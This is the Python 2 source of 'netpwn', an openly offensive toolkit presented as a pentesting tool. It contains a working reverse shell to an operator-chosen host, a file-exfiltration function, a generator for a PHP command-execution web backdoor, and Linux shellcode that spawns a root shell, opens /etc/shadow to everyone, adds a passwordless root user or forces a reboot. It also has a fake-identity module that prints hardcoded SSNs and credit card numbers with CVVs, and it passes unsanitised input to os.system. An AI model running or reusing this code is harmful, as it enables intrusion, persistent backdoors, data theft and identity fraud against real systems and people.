"""netpwn pentesting tool"""
# !/usr/bin/python
# Created by 3XPL017
# Member of @togetherwehack
# Install tcpdump, and iftop for full functionality

from urllib2 import urlopen
import fcntl
import struct
import base64
import readline
import re
import random
import os
import sys
import socket
import subprocess
from termcolor import colored
import netifaces
import nmap
from faker import Faker

OPTIONS_SL = [
    'reverse_shell',
    'packet_capture',
    'port_scan',
    'send_file',
    'web_backdoor',
    'network_conns',
    'hash_check',
    'base64_converter',
    'address_info',
    'generate_shellcode',
    'hex_converter',
    'page_contents',
    'password_checker',
    'fake_identity',
    'modules'
    ]

TABCOMP = OPTIONS_SL


def completer(text, state):
    """Tab complete"""
    options = [x for x in TABCOMP if x.startswith(text)]

    try:
        return options[state]

    except IndexError:
        return None


readline.set_completer(completer)
readline.parse_and_bind("tab: complete")


def check_root():
    """Checks for root privileges"""

    if not os.geteuid() == 0:
        return False


def banner():
    """Displays the netpwn banner"""
    print colored(r'               __                       ', 'blue')
    print colored(r'  ____   _____/  |_________  _  ______  ', 'blue')
    print colored(r' /    \_/ __ \   __\____ \ \/ \/ /    \ ', 'blue')
    print colored(r'|   |  \  ___/|  | |  |_> >     /   |  \ ', 'blue')
    print colored(r'|___|  /\___  >__| |   __/ \/\_/|___|  /', 'blue')
    print colored(r'     \/     \/     |__|              \/ ', 'blue')
    print ' '
    print colored(r'     | Created by 3XPL017         |', 'blue')
    print colored(r'     | twitter: @3XPL017GH057     |', 'blue')
    print colored(r'     | https://github.com/3XPL017 |', 'blue')
    print ' '
    print colored(r'     Type [show modules] to show modules', 'green')
    print colored(r'     Type [run <name of module>] to run it', 'green')
    print colored(r'     Type [exit] or [quit] to quit', 'green')
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '
    print ' '


def reverse_shell():
    """Creates a reverse shell using /bin/sh"""
    try:
        print colored('Enter the IP to connect to', 'green')
        tgt_host = raw_input(colored('reverse_shell> ', 'red'))
        print colored('Enter the port to connect to', 'green')
        tgt_port = int(raw_input(colored('reverse_shell> ', 'red')))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((tgt_host, tgt_port))
        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()

    except socket.error:
        print colored('Could not connect to host', 'yellow')

    except ValueError:
        print colored('Not a valid IP or port', 'yellow')


def packet_capture():
    """Starts tcpdump"""
    print colored('Enter inteface to capture on', 'green')
    interface = raw_input(colored('packet_capture> ', 'red'))
    print colored('Outputting to capture.pcap', 'green')
    os.system('tcpdump -i' + interface + ' -w capture.pcap')


def port_scan():
    """Uses nmap to port scan"""
    print colored('Enter IP or IP range to scan', 'green')
    target = raw_input(colored('port_scan> ', 'red'))
    target = socket.gethostbyname(target)
    scanner = nmap.PortScanner()
    print colored('Starting nmap', 'green')
    scanner.scan(target)
    scanner.command_line()
    scanner.scaninfo()
    divider = '-------------------------------------------------------------'

    for host in scanner.all_hosts():
        print colored(divider, 'green')
        print colored(
            'Host : %s (%s)' % (target, scanner[host].state()),
            'green')
        print colored('State : %s' % scanner[host].state(), 'green')

        for proto in scanner[target].all_protocols():
            print colored(divider, 'green')
            print colored('Protocol : %s' % proto, 'green')
            lport = scanner[target][proto].keys()
            lport.sort()

            for port in lport:
                print colored(
                    'port : %s\tstate : %s' %
                    (port, scanner[target][proto][port]['state']),
                    'green')
                print colored(divider, 'green')


def send_file():
    """Sends file to remote location"""
    try:
        print colored('Enter the IP to send file to', 'green')
        address = raw_input(colored('send_file> ', 'red'))
        print colored('Enter the port to send file to', 'green')
        port = int(raw_input(colored('send_file> ', 'red')))
        print colored('Enter directory of file to send', 'green')
        input_file = raw_input(colored('send_file> ', 'red'))
        open_file = open(input_file)
        send = open_file.read()
        transfer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        transfer.connect((address, port))
        transfer.send(send)

    except ValueError as error:
        print colored('Could not send file to ' + str(error), 'yellow')

    except IOError as error:
        print colored('Could not find ' + str(error), 'yellow')


def web_backdoor():
    """Creates a backdoor in php"""
    print colored('Creating backdoor.php', 'green')
    print colored('Usage: http://<localIP>/backdoor.php?cmd=', 'green')
    code = "<html> <?php system($_GET['cmd']);?> </html>"
    backdoor = open('backdoor.php', 'w')
    backdoor.write(code)
    backdoor.close()


def network_conns():
    """Uses iftop to show connections"""
    print colored('Enter interface', 'green')
    interface = raw_input(colored('network_conns> ', 'red'))
    os.system('iftop -i ' + interface)


def hash_check():
    """Detects input hash type"""
    print colored('Enter a hash to determine its type', 'green')
    input_hash = raw_input(colored('hash_check> ', 'red'))

    if len(input_hash) == 32:
        print colored('Hash type: md5', 'green')

    elif len(input_hash) == 40:
        print colored('Hash type: sha1', 'green')

    elif len(input_hash) == 64:
        print colored('Hash type: sha256', 'green')

    elif len(input_hash) == 128:
        print colored('Hash type: sha512', 'green')

    else:
        print colored('No hash type found', 'green')


def base64_converter():
    """Converts to and from base64"""
    print colored('Enter some text to encode or decode as base64', 'green')
    print colored('This will automatically try to encode or decode', 'green')
    input_str = raw_input(colored('base64_converter> ', 'red'))

    try:
        output = base64.b64decode(input_str)
        output.encode('ascii')

    except ValueError:
        output = base64.b64encode(input_str)

    print colored(output, 'green')


def address_info():
    """Gets networking information"""
    print colored('Enter interface', 'green')
    interface = raw_input(colored('address_info> ', 'red'))

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        val = struct.pack('256s', interface[:15])
        info = fcntl.ioctl(sock.fileno(), 0x8927, val)
        joining = ['%02x' % ord(char) for char in info[18:24]]
        print colored('Your MAC is: ' + ':'.join(joining), 'green')

    except IOError as error:
        print colored('Invalid interface ' + str(error), 'yellow')

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(('8.8.8.8', 80))
    print colored('Your ipv4 is : ' + (sock.getsockname()[0]), 'green')
    sock.close()

    try:
        addrs = netifaces.ifaddresses(interface)
        address6 = addrs[netifaces.AF_INET6][0]['addr']
        address6_1 = addrs[netifaces.AF_INET6][1]['addr']
        address6_2 = addrs[netifaces.AF_INET6][2]['addr']
        print colored('Your ipv6 is: ' + address6, 'green')
        print colored('Your ipv6 is: ' + address6_1, 'green')
        print colored('Your ipv6 is: ' + address6_2, 'green')

    except ValueError as error:
        print colored('Invalid interface ' + str(error), 'yellow')

    my_gateway = netifaces.gateways()
    getgateway = my_gateway['default'][socket.AF_INET][0]
    print colored('Your default gateway is: ' + getgateway, 'green')

    my_ip = urlopen('http://ip.42.pl/raw').read()
    print colored('Your public IP is: ' + my_ip, 'green')


def generate_shellcode():
    """Generates shellcode of linux"""
    print colored('Enter target operating system', 'green')
    platform = raw_input(colored('generate_shellcode> ', 'red'))

    if platform == 'linux':
        print colored('Enter target architechure', 'green')
        arch = raw_input(colored('generate_shellcode> ', 'red'))

        if arch == 'x86':
            print colored('Execute /bin/sh:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f'
                '\\x62\\x69\\x6e\\x89\\xe3\\x89'
                '\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80',
                'green')
            print ' '
            print colored('Chmod 777 /etc/shadow:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\xb0\\x0f\\x68\\x61\\x64\\x6f\\x77'
                '\\x68\\x63\\x2f\\x73\\x68\\x68\\x2f'
                '\\x2f\\x65\\x74\\x89\\xe3\\x31\\xc9\\x66\\xb9\\xff\\x01\\xcd'
                '\\x80\\x40\\xcd\\x80',
                'green')
            print ' '
            print colored('Create root user r00t with no password:', 'green')
            print colored(
                '\\x6a\\x05\\x58\\x31\\xc9\\x51\\x68\\x73\\x73\\x77'
                '\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74'
                '\\x63\\x89\\xe3\\x66'
                '\\xb9\\x01\\x04\\xcd\\x80\\x89\\xc3\\x6a\\x04\\x58\\x31\\xd2'
                '\\x52\\x68\\x30\\x3a\\x3a\\x3a\\x68\\x3a\\x3a\\x30\\x3a\\x68'
                '\\x72\\x30\\x30\\x74\\x89\\xe1\\x6a\\x0c\\x5a\\xcd\\x80\\x6a'
                '\\x06\\x58\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80',
                'green')
            print ' '
            print colored('Forced reboot:', 'green')
            print colored(
                '\\x31\\xc0\\x50\\x68\\x62\\x6f\\x6f\\x74\\x68\\x6e'
                '\\x2f\\x72\\x65\\x68\\x2f\\x73\\x62'
                '\\x69\\x89\\xe3\\x50\\x66\\x68\\x2d\\x66\\x89\\xe6\\x50\\x56'
                '\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80',
                'green')

        elif arch == 'x64':
            print colored('Execute /bin/sh and setuid(0):', 'green')
            print colored(
                '\\x48\\x31\\xff\\xb0\\x69\\x0f\\x05\\x48\\x31\\xd2'
                '\\x48\\xbb\\xff\\x2f\\x62\\x69'
                '\\x6e\\x2f\\x73\\x68\\x48\\xc1\\xeb\\x08\\x53\\x48\\x89\\xe7'
                '\\x48\\x31\\xc0\\x50\\x57\\x48'
                '\\x89\\xe6\\xb0\\x3b\\x0f\\x05\\x6a\\x01\\x5f\\x6a\\x3c\\x58'
                '\\x0f\\x05',
                'green')
            print ' '
            print colored('Power off', 'green')
            print colored(
                '\\xba\\xdc\\xfe\\x21\\x43\\xbe\\x69\\x19\\x12'
                '\\x28\\xbf\\xad\\xde\\xe1\\xfe'
                '\\xb0\\xa9\\x0f\\x05',
                'green')

        else:
            print colored('Not a valid architecture', 'yellow')

    elif platform == 'mac':
        print colored('HAHA no', 'yellow')

    elif platform == 'windows':
        print colored('Lol windows... seriously...fine', 'yellow')
        print colored(
            'I would ask you for the architecture but I do not '
            'care very much so here try this it might'
            ' work on some windows xp version but i doubt it can be very '
            'useful unless you need to do some math...',
            'green')
        print colored(
            '\\xeb\\x1b\\x5b\\x31\\xc0\\x50\\x31\\xc0\\x88\\x43'
            '\\x13\\x53\\xbb\\xad\\x23\\x86\\x7c'
            '\\xff\\xd3\\x31\\xc0\\x50\\xbb\\xfa\\xca\\x81\\x7c\\xff\\xd3'
            '\\xe8\\xe0\\xff\\xff\\xff'
            '\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x63'
            '\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65',
            'green')
        print ' '
        print colored(
            'Instead of trying to run your shellcode on a windows '
            'box perhaps leave a note for the admin telling'
            ' them about this cool thing called linux',
            'green')

    else:
        print colored('Not a valid option try typing linux', 'yellow')


def hex_converter():
    """Converts to and from hexadecimal"""
    print colored('This converts hex to ascii and ascii to hex')
    input_str = raw_input(colored('hex_converter> ', 'red'))
    decoded = input_str
    encoded = input_str

    try:
        if any(i in decoded for i in '0x'):
            decoded = decoded.replace('0x', '')

        if any(i in decoded for i in '\\x'):
            decoded = decoded.replace('\\x', '')

        decoded = decoded.decode('hex')
        print colored('Decoded as: ' + decoded, 'green')

    except TypeError:
        print colored('No hex value was given to decode', 'yellow')

    encoded = encoded.encode('hex')
    print colored('Encoded as: ' + '0x' + encoded)


def page_contents():
    """Shows contents of a web page"""

    try:
        print colored('Enter URL', 'green')
        page = raw_input(colored('page_contents> ', 'red'))
        contents = urlopen(page).read()
        save = raw_input(colored('Save to file: ', 'green'))

        if save == 'yes' or save == 'y':
            print colored('Saved to page.txt', 'green')
            save_file = open('page.txt', 'w')
            save_file.write(contents)

        else:
            print colored(contents, 'green')

    except ValueError as error:
        print colored('Not a valid URL ' + str(error), 'yellow')


def password_checker():
    """Checks password strength"""
    print colored('Enter a password to check', 'green')
    password = raw_input(colored('password_checker> ', 'red'))
    length = len(password)
    length = str(length)

    if length < 12:
        print colored('Your password is too short ', 'yellow')

    else:
        print colored('Good password length', 'green')

    if password.isupper() is False and password.islower() is False:
        print colored('Good password case mixture', 'green')

    else:
        print colored('Bad password case mixture', 'yellow')

    if re.match('^[a-zA-Z0-9_]*$', password):
        print colored('Does not contain special chararacters', 'yellow')

    else:
        print colored('Does contain special chararacters', 'green')

    def check_for_nums(password):
        """Checks password for numbers"""
        return any(i.isdigit() for i in password)

    if check_for_nums(password) is False:
        print colored('Your password does not contain any numbers', 'yellow')

    else:
        print colored('Your password contains numbers', 'green')


def race_selection():
    """Chooses race"""
    fake = Faker()
    print colored('Name: ' + fake.name(), 'green')
    race_picker = random.randint(0, 5)

    race = {
        0: 'Caucasian',
        1: 'African-American',
        2: 'Mexican',
        3: 'Indian',
        4: 'Asian',
        5: 'Native American'
    }

    print colored('Race: ' + race.get(race_picker), 'green')


def ssn_selection():
    """Chooses SSN"""
    ssn_picker = random.randint(0, 9)

    ssn = {
        0: '601-66-9922',
        1: '514-01-4301',
        2: '557-59-6355',
        3: '526-32-3501',
        4: '379-34-0764',
        5: '142-92-3338',
        6: '590-98-1631',
        7: '307-48-2152',
        8: '419-10-9081',
        9: '216-75-7723'
    }

    print colored('SSN: ' + ssn.get(ssn_picker), 'green')


def number_selection():
    """Chooses number"""
    number_picker = random.randint(0, 9)
    number = {
        0: '(535)583-0231',
        1: '(224)201-2034',
        2: '(732)923-4145',
        3: '(712)372-5977',
        4: '(741)156-2911',
        5: '(728)800-9349',
        6: '(644)715-4316',
        7: '(501)981-9384',
        8: '(277)120-1523',
        9: '(786)479-6690'
    }

    print colored('Phone number: ' + number.get(number_picker), 'green')


def month_selection():
    """Chooses DOB"""
    month_picker = random.randint(0, 11)
    yold = random.randint(18, 80)
    year = 2018 - yold
    day = random.randint(1, 28)

    month = {
        0: 'Jan',
        1: 'Feb',
        2: 'Mar',
        3: 'Apr',
        4: 'May',
        5: 'Jun',
        6: 'Jul',
        7: 'Aug',
        8: 'Sep',
        9: 'Oct',
        10: 'Nov',
        11: 'Dec'
    }

    exact_month = month.get(month_picker)
    date = exact_month + ' ' + str(day) + ' ' + str(year)
    print colored('DOB: ' + date, 'green')


def credit_selection():
    """Chooses SSN"""
    type_picker = random.randint(0, 4)
    number_picker = random.randint(0, 4)
    cvv_picker = random.randint(0, 4)
    date_picker = random.randint(0, 4)

    credit_type = {
        0: 'Visa',
        1: 'MasterCard',
        2: 'Discover',
        3: 'American Express'
    }

    credit_number = {
        0: '4556 4066 7210 4022',
        1: '5412 2385 4585 1237',
        2: '4916 9666 2747 3751',
        3: '4556 9906 6141 1282',
        4: '5536 1594 9361 1707'
    }

    credit_cvv = {
        0: '467',
        1: '900',
        2: '713',
        3: '766',
        4: '658'
    }

    credit_date = {
        0: '2/19',
        1: '4/19',
        2: '10/17',
        3: '12/18',
        4: '8/19'
    }

    get_type = credit_type.get(type_picker)
    get_number = credit_number.get(number_picker)
    get_cvv = credit_cvv.get(cvv_picker)
    get_date = credit_date.get(date_picker)
    print colored('Credit card: ', 'green')
    print colored(get_type, 'green')
    print colored(get_number, 'green')
    print colored(get_cvv, 'green')
    print colored(get_date, 'green')


def fake_identity():
    """Generates a fake identity"""
    fake = Faker()
    race_selection()
    ssn_selection()
    number_selection()
    address = fake.address()
    print colored('Address: ' + address, 'green')
    credit_selection()


def modules():
    """Prints available modules"""
    print colored('reverse_shell', 'green')
    print colored('packet_capture', 'green')
    print colored('port_scan', 'green')
    print colored('send_file', 'green')
    print colored('web_backdoor', 'green')
    print colored('network_conns', 'green')
    print colored('hash_check', 'green')
    print colored('base64_converter', 'green')
    print colored('address_info', 'green')
    print colored('generate_shellcode', 'green')
    print colored('hex_converter', 'green')
    print colored('page_contents', 'green')
    print colored('password_checker', 'green')
    print colored('fake_identity', 'green')


def main():
    """Handles which function to run"""

    if check_root() is False:
        sys.exit(colored('netpwn must be run as root', 'yellow'))

    choice = raw_input(colored('netpwn> ', 'red'))

    options = {
        'run reverse_shell': lambda: reverse_shell(),
        'run packet_capture': lambda: packet_capture(),
        'run port_scan': lambda: port_scan(),
        'run send_file': lambda: send_file(),
        'run web_backdoor': lambda: web_backdoor(),
        'run network_conns': lambda: network_conns(),
        'run hash_check': lambda: hash_check(),
        'run base64_converter': lambda: base64_converter(),
        'run address_info': lambda: address_info(),
        'run generate_shellcode': lambda: generate_shellcode(),
        'run hex_converter': lambda: hex_converter(),
        'run page_contents': lambda: page_contents(),
        'run password_checker': lambda: password_checker(),
        'run fake_identity': lambda: fake_identity(),
        'show modules': lambda: modules(),
        'clear': lambda: os.system('clear'),
        'banner': lambda: banner(),
        'exit': lambda: exit(0),
        'quit': lambda: exit(0),
        '': lambda: 1 + 1,
    }

    options.get(choice, lambda: None)()
    main()


if __name__ == '__main__':
    check_root()
    banner()
    main()
